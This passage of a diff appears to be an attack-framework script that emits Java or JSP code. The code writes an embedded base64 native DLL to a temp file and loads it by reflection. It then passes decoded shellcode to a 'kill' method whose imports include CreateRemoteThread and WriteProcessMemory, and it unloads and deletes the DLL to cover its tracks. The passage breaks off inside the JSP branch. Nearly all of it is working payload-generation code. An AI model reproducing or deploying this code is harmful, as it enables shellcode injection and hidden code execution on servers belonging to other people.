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AAAAAAAAElQAAAAAAABiVAAAAAAAAJpUAAAAAAABClQAAAAAAAFSVAAAAAAAAZpUAAAAAAAB6lQAAAAAAAIqVAAAAAAAAAAAAAAAAAACglQAAAAAAAK6VAAAAAAAAvJUAAAAAAADIlQAAAAAAANCVAAAAAAAA2pUAAAAAAADilQAAAAAAAOyVAAAAAAAA9JUAAAAAAAD+lQAAAAAAAAiWAAAAAAAAEpYAAAAAAAAclgAAAAAAACaWAAAAAAAAMJYAAAAAAAAAAAAAAAAAAIMAQ2xvc2VIYW5kbGUA3gBDcmVhdGVQcm9jZXNzQQAA4wBDcmVhdGVSZW1vdGVUaHJlYWQAAA0BRGVsZXRlQ3JpdGljYWxTZWN0aW9uADEBRW50ZXJDcml0aWNhbFNlY3Rpb24AABgCR2V0Q3VycmVudFByb2Nlc3MAGQJHZXRDdXJyZW50UHJvY2Vzc0lkAB0CR2V0Q3VycmVudFRocmVhZElkAAA5AkdldEVudmlyb25tZW50VmFyaWFibGVBAGICR2V0TGFzdEVycm9yAADSAkdldFN0YXJ0dXBJbmZvQQDrAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAAcDR2V0VGlja0NvdW50AABgA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb24AuANMZWF2ZUNyaXRpY2FsU2VjdGlvbgAARgRRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgCcBFJ0bEFkZEZ1bmN0aW9uVGFibGUAnQRSdGxDYXB0dXJlQ29udGV4dACkBFJ0bExvb2t1cEZ1bmN0aW9uRW50cnkAAKsEUnRsVmlydHVhbFVud2luZAAAQwVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAUQVTbGVlcABgBVRlcm1pbmF0ZVByb2Nlc3MAAHQFVGxzR2V0VmFsdWUAggVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAAJ4FVmlydHVhbEFsbG9jRXgAAKMFVmlydHVhbFByb3RlY3QAAKQFVmlydHVhbFByb3RlY3RFeAAApQVWaXJ0dWFsUXVlcnkAAO8FV3JpdGVQcm9jZXNzTWVtb3J5AABUAF9faW9iX2Z1bmMAAH4AX2Ftc2dfZXhpdAAATgFfaW5pdHRlcm0AugFfbG9jawA2A191bmxvY2sADARhYm9ydAA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";
+
+    if((%options["type"] eq "JAVA")) {
+        $data = $data . "import java.io.*;\r\n";
+        $data = $data . "import java.lang.reflect.*;\r\n";
+        $data = $data . "import java.util.Vector;\r\n";
+        $data = $data . "public class Report extends ClassLoader{\r\n";
+        $data = $data . "    private static final String CLASS_NAME = \"Killer\";\r\n";
+        $data = $data . "    private final static char intToBase64[] = {\r\n";
+        $data = $data . "            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',\r\n";
+        $data = $data . "            'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',\r\n";
+        $data = $data . "            'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',\r\n";
+        $data = $data . "            'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\r\n";
+        $data = $data . "            'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\r\n";
+        $data = $data . "            'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',\r\n";
+        $data = $data . "            '8', '9', '+', '/'\r\n";
+        $data = $data . "    };\r\n";
+        $data = $data . "    private final static byte base64ToInt[] = {\r\n";
+        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "            -1, -1, -1, 62, -1, -1, -1, 63, 52, 53,\r\n";
+        $data = $data . "            54, 55, 56, 57, 58, 59, 60, 61, -1, -1,\r\n";
+        $data = $data . "            -1, -1, -1, -1, -1, 0, 1, 2, 3, 4,\r\n";
+        $data = $data . "            5, 6, 7, 8, 9, 10, 11, 12, 13, 14,\r\n";
+        $data = $data . "            15, 16, 17, 18, 19, 20, 21, 22, 23, 24,\r\n";
+        $data = $data . "            25, -1, -1, -1, -1, -1, -1, 26, 27, 28,\r\n";
+        $data = $data . "            29, 30, 31, 32, 33, 34, 35, 36, 37, 38,\r\n";
+        $data = $data . "            39, 40, 41, 42, 43, 44, 45, 46, 47, 48,\r\n";
+        $data = $data . "            49, 50, 51\r\n";
+        $data = $data . "    };\r\n";
+        $data = $data . "    public static byte[] decode(String source) {\r\n";
+        $data = $data . "        int num=0;\r\n";
+        $data = $data . "        int numBytes=0;\r\n";
+        $data = $data . "        int eofBytes = 0;\r\n";
+        $data = $data . "        java.io.ByteArrayOutputStream bout = new java.io.ByteArrayOutputStream();\r\n";
+        $data = $data . "        for (int i = 0; i < source.length(); i++) {\r\n";
+        $data = $data . "            char c = source.charAt(i);\r\n";
+        $data = $data . "            if (Character.isWhitespace(c))\r\n";
+        $data = $data . "                continue;\r\n";
+        $data = $data . "            if (c == '=') {\r\n";
+        $data = $data . "                eofBytes++;\r\n";
+        $data = $data . "                num = num << 6;\r\n";
+        $data = $data . "                switch (++numBytes) {\r\n";
+        $data = $data . "                    case 1:\r\n";
+        $data = $data . "                    case 2:\r\n";
+        $data = $data . "                        throw new RuntimeException(\"Unexpected end of stream character (=)\");\r\n";
+        $data = $data . "                    case 3:\r\n";
+        $data = $data . "                        break;\r\n";
+        $data = $data . "                    case 4:\r\n";
+        $data = $data . "                        bout.write((byte) (num >> 16));\r\n";
+        $data = $data . "                        if (eofBytes == 1)\r\n";
+        $data = $data . "                            bout.write((byte) (num >> 8));\r\n";
+        $data = $data . "                        break;\r\n";
+        $data = $data . "                    case 5:\r\n";
+        $data = $data . "                        throw new RuntimeException(\"Trailing garbage detected\");\r\n";
+        $data = $data . "                    default:\r\n";
+        $data = $data . "                        throw new IllegalStateException(\"Invalid value for numBytes\");\r\n";
+        $data = $data . "                }\r\n";
+        $data = $data . "                continue;\r\n";
+        $data = $data . "            }\r\n";
+        $data = $data . "            if (eofBytes > 0)\r\n";
+        $data = $data . "                throw new RuntimeException(\"Base64 characters after end of stream character (=) detected.\");\r\n";
+        $data = $data . "            if (c >= 0 && c < base64ToInt.length) {\r\n";
+        $data = $data . "                int result = base64ToInt[c];\r\n";
+        $data = $data . "                if (result >= 0) {\r\n";
+        $data = $data . "                    num = (num << 6) + result;\r\n";
+        $data = $data . "                    if (++numBytes != 4)\r\n";
+        $data = $data . "                        continue;\r\n";
+        $data = $data . "                    bout.write((byte) (num >> 16));\r\n";
+        $data = $data . "                    bout.write((byte) (num >> 8 & 0xff));\r\n";
+        $data = $data . "                    bout.write((byte) (num & 0xff));\r\n";
+        $data = $data . "                    num = 0;\r\n";
+        $data = $data . "                    numBytes = 0;\r\n";
+        $data = $data . "                    continue;\r\n";
+        $data = $data . "                }\r\n";
+        $data = $data . "            }\r\n";
+        $data = $data . "            if (!Character.isWhitespace(c))\r\n";
+        $data = $data . "                throw new RuntimeException(\"Invalid Base64 character: \" + (int) c);\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "        return bout.toByteArray();\r\n";
+        $data = $data . "    }\r\n";
+        $data = $data . "    private static final byte[] CLASS_BYTES = new byte[] {-54,-2,-70,-66,0,0,0,49,0,15,10,0,3,0,12,7,0,13,7,0,14,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,4,107,105,108,108,1,0,5,40,91,66,41,86,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,11,75,105,108,108,101,114,46,106,97,118,97,12,0,4,0,5,1,0,6,75,105,108,108,101,114,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,0,33,0,2,0,3,0,0,0,0,0,2,0,1,0,4,0,5,0,1,0,6,0,0,0,29,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,1,0,7,0,0,0,6,0,1,0,0,0,1,1,1,0,8,0,9,0,0,0,1,0,10,0,0,0,2,0,11};\r\n";
+        $data = $data . "    protected Class<?> findClass(String name){\r\n";
+        $data = $data . "        try {\r\n";
+        $data = $data . "            return super.findClass(name);\r\n";
+        $data = $data . "        } catch (ClassNotFoundException e) {\r\n";
+        $data = $data . "            return defineClass(CLASS_NAME, CLASS_BYTES, 0, CLASS_BYTES.length);\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "    }\r\n";
+        $data = $data . "    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {\r\n";
+        $data = $data . "        StringBuilder b64 = new StringBuilder();\r\n";
+        $length = strlen($b64payload);
+        $index = 0;
+        while($length > $index){
+            $data = $data . "b64.append(\"". substr($b64payload, $index, $index + 1000) ."\");\n";
+            $index = $index + 1000;
+        }
+        $data = $data . "        byte[] shell = decode(b64.toString());\r\n";
+        $data = $data . "        String JNI_FILE_BYTES = \"". $b64Dll . "\";\r\n";
+        $data = $data . "        File library = File.createTempFile(\"apache10192\", \".cache\");\r\n";
+        $data = $data . "        ClassLoader loader = new Report();\r\n";
+        $data = $data . "        byte[] data = decode(JNI_FILE_BYTES);\r\n";
+        $data = $data . "        FileOutputStream output = new FileOutputStream(library,false);\r\n";
+        $data = $data . "        output.write(data, 0, data.length);\r\n";
+        $data = $data . "        output.close();\r\n";
+        $data = $data . "        try {\r\n";
+        $data = $data . "            Class  commandClass = loader.loadClass(\"Killer\");\r\n";
+        $data = $data . "            Object loadLib      = null;\r\n";
+        $data = $data . "            if (loadLib == null || !((Boolean) loadLib)) {\r\n";
+        $data = $data . "                java.lang.reflect.Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod(\"loadLibrary0\", Class.class, java.io.File.class);\r\n";
+        $data = $data . "                loadLibrary0Method.setAccessible(true);\r\n";
+        $data = $data . "                loadLibrary0Method.invoke(loader, commandClass, library);\r\n";
+        $data = $data . "            }\r\n";
+        $data = $data . "            java.lang.reflect.Constructor constructor = commandClass.getDeclaredConstructor();\r\n";
+        $data = $data . "            Object instance = constructor.newInstance();\r\n";
+        $data = $data . "            commandClass.getMethod(\"kill\", byte[].class).invoke(instance, shell);\r\n";
+        $data = $data . "        } catch (Exception e) {\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "        try{\r\n";
+        $data = $data . "            Field field = ClassLoader.class.getDeclaredField(\"nativeLibraries\");\r\n";
+        $data = $data . "            field.setAccessible(true);\r\n";
+        $data = $data . "            Vector<Object> libraryVictor = (Vector<Object>)field.get(loader);\r\n";
+        $data = $data . "            for(Object obj : libraryVictor){\r\n";
+        $data = $data . "                Class clazz = obj.getClass();\r\n";
+        $data = $data . "                Field nameField = clazz.getDeclaredField(\"name\");\r\n";
+        $data = $data . "                nameField.setAccessible(true);\r\n";
+        $data = $data . "                String jniName = (String)nameField.get(obj);\r\n";
+        $data = $data . "                if(jniName.contains(\"apache10192\")){\r\n";
+        $data = $data . "                    Method method = clazz.getDeclaredMethod(\"finalize\");\r\n";
+        $data = $data . "                    method.setAccessible(true);\r\n";
+        $data = $data . "                    method.invoke(obj);\r\n";
+        $data = $data . "                    if(library.exists()){\r\n";
+        $data = $data . "                        library.delete();\r\n";
+        $data = $data . "                    }\r\n";
+        $data = $data . "                }\r\n";
+        $data = $data . "            }\r\n";
+        $data = $data . "        }catch(Exception e){\r\n";
+        $data = $data . "            e.printStackTrace();\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "    }\r\n";
+        $data = $data . "}\r\n";
+    }else if((%options["type"] eq "JSP")){
+        $data = $data . "<%!\r\n";
+        $data = $data . "    private static final String COMMAND_CLASS_NAME = \"Killer\";\r\n";
+        $data = $data . "    private final char intToBase64[] = {\r\n";
+        $data = $data . "        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',\r\n";
+        $data = $data . "        'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',\r\n";
+        $data = $data . "        'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',\r\n";
+        $data = $data . "        'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\r\n";
+        $data = $data . "        'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\r\n";
+        $data = $data . "        'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',\r\n";
+        $data = $data . "        '8', '9', '+', '/'\r\n";
+        $data = $data . "    };\r\n";
+        $data = $data . "    private final byte base64ToInt[] = {\r\n";
+        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
+        $data = $data . "        -1, -1, -1, 62, -1, -1, -1, 63, 52, 53,\r\n";
+        $data = $data . "        54, 55, 56, 57, 58, 59, 60, 61, -1, -1,\r\n";
+        $data = $data . "        -1, -1, -1, -1, -1, 0, 1, 2, 3, 4,\r\n";
+        $data = $data . "        5, 6, 7, 8, 9, 10, 11, 12, 13, 14,\r\n";
+        $data = $data . "        15, 16, 17, 18, 19, 20, 21, 22, 23, 24,\r\n";
+        $data = $data . "        25, -1, -1, -1, -1, -1, -1, 26, 27, 28,\r\n";
+        $data = $data . "        29, 30, 31, 32, 33, 34, 35, 36, 37, 38,\r\n";
+        $data = $data . "        39, 40, 41, 42, 43, 44, 45, 46, 47, 48,\r\n";
+        $data = $data . "        49, 50, 51\r\n";
+        $data = $data . "    };\r\n";
+        $data = $data . "    public byte[] decode(String source) {\r\n";
+        $data = $data . "        int num=0;\r\n";
+        $data = $data . "        int numBytes=0;\r\n";
+        $data = $data . "        int eofBytes = 0;\r\n";
+        $data = $data . "        java.io.ByteArrayOutputStream bout = new java.io.ByteArrayOutputStream();\r\n";
+        $data = $data . "        for (int i = 0; i < source.length(); i++) {\r\n";
+        $data = $data . "            char c = source.charAt(i);\r\n";
+        $data = $data . "            if (Character.isWhitespace(c))\r\n";
+        $data = $data . "            continue;\r\n";
+        $data = $data . "            if (c == '=') {\r\n";
+        $data = $data . "            eofBytes++;\r\n";
+        $data = $data . "            num = num << 6;\r\n";
+        $data = $data . "            switch (++numBytes) {\r\n";
+        $data = $data . "                case 1:\r\n";
+        $data = $data . "                case 2:\r\n";
+        $data = $data . "                throw new RuntimeException(\"Unexpected end of stream character (=)\");\r\n";
+        $data = $data . "                case 3:\r\n";
+        $data = $data . "                break;\r\n";
+        $data = $data . "                case 4:\r\n";
+        $data = $data . "                bout.write((byte) (num >> 16));\r\n";
+        $data = $data . "                if (eofBytes == 1)\r\n";
+        $data = $data . "                bout.write((byte) (num >> 8));\r\n";
+        $data = $data . "                break;\r\n";
+        $data = $data . "                case 5:\r\n";
+        $data = $data . "                throw new RuntimeException(\"Trailing garbage detected\");\r\n";
+        $data = $data . "                default:\r\n";
+        $data = $data . "                throw new IllegalStateException(\"Invalid value for numBytes\");\r\n";
+        $data = $data . "            }\r\n";
+        $data = $data . "            continue;\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "        if (eofBytes > 0)\r\n";
+        $data = $data . "        throw new RuntimeException(\"Base64 characters after end of stream character (=) detected.\");\r\n";
+        $data = $data . "        if (c >= 0 && c < base64ToInt.length) {\r\n";
+        $data = $data . "            int result = base64ToInt[c];\r\n";
+        $data = $data . "            if (result >= 0) {\r\n";
+        $data = $data . "            num = (num << 6) + result;\r\n";
+        $data = $data . "            if (++numBytes != 4)\r\n";
+        $data = $data . "            continue;\r\n";
+        $data = $data . "            bout.write((byte) (num >> 16));\r\n";
+        $data = $data . "            bout.write((byte) (num >> 8 & 0xff));\r\n";
+        $data = $data . "            bout.write((byte) (num & 0xff));\r\n";
+        $data = $data . "            num = 0;\r\n";
+        $data = $data . "            numBytes = 0;\r\n";
+        $data = $data . "            continue;\r\n";
+        $data = $data . "        }\r\n";
+        $data = $data . "    }\r\n";
+        $data = $data . "        if (!Character.isWhitespace(c))\r\n";
+        $data = $data . "            throw new RuntimeException(\"Invalid Base64 character: \" + (int) c);\r\n";
+        $data = $data . "    }\r\n";
+        $data = $data . "        return bout.toByteArray();\r\n";
+        $data = $data . "    }\r\n";
